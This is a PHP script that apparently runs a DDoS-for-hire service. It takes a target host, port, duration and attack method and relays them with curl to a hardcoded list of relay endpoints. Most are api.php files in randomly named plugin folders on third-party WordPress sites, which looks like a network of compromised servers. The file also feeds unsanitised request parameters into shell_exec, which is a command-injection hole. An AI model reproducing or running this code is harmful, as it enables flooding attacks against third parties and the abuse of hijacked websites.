<?php
ignore_user_abort(true);
set_time_limit(0);
error_reporting(-1);

$free = array("https://birsufm.com/api.php", "https://citymovers.co.nz/wp-content/plugins/cndnfhuwek/api.php");

$paid = array(
    "https://3-upstesting.site/api.php", "https://gridermarketing.com/wp-admin/api.php", "https://clinicapequenosanjos.com.br/wp-admin/api.php", "http://casinonextyear19.com/wp-admin/api.php", "https://totomtpolice.com/wp-admin/api.php", "https://services365.ca/wp-content/plugins/wvfhjwxtei/api.php", "https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php", "https://co-branding.co.nz/wp-content/plugins/vdpqlwveqc/api.php", "http://guvenveroline.com/wp-content/plugins/vugkgazcpj/api.php", "https://touchofthetropics.co.nz/wp-content/plugins/pnrjbnwzyj/api.php", "https://brockinteriorsltd.com/test/wp-content/plugins/pqcpcyldhr/api.php", "https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php", "https://constructionnewshubb.com/wp-content/plugins/kjnzakirfr/api.php", "http://ebikes.wdemo.in/admin/controller/extension/extension/api.php", "https://www.developershopon.com/wp-admin/api.php", "https://www.ultrapetsupplies.co.nz/wp-content/plugins/ybdioxgbdu/api.php"
);

$digital = array('http://164.92.244.96/api.php');

$full = array_merge($paid, $free, $digital);


$key = $_GET['key'];
$ckey = $_GET['ckey'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$list = $_GET['list'];

$lists = array("free", "paid", "digital", "full");
$ray = array("7ed408c442ecdf2a8e16398a6f05355c");

if (!empty($key)) {
} else {
    die('Error: API key is empty!');
}

if (!empty($ckey)) {
} else {
    die('Error: Control key is empty!');
}

if (in_array(md5($ckey), $ray)) {
} else {
    die('Error: Incorrect Control key!');
}

if (!empty($list)) {
} else {
    die('Error: List is empty!');
}

if (in_array($list, $lists)) {
} else {
    die('Error: Incorrect list!');
}

if (!empty($time)) {
} else {
    die('Error: time is empty!');
}


if (!empty($host)) {
} else {
    die('Error: Host is empty!');
}

if (!empty($port)) {
} else {
    die('Error: Port is empty!');
}


if (!empty($method)) {
} else {
    die('Error: Method is empty!');
}


if ($port > 44405) {
    die('Error: Ports over 44405 do not exist');
}

$servers = array();

switch ($list) {
    case "free":
        $servers = $free;
        break;
    case "paid":
        $servers = $paid;
    case "digital":
        $servers = $digital;
        break;
    case "full":
        $servers = $full;
        break;
}

foreach ($servers as $i => $url) {
    $params = "?host=$host&port=$port&time=$time&key=$key&method=$method";
    $to_req =  $url . $params;
    $a = shell_exec("curl -X GET \"$to_req\"");
    echo "<a style='color:green'>$to_req</a><br>$a<br>";
}
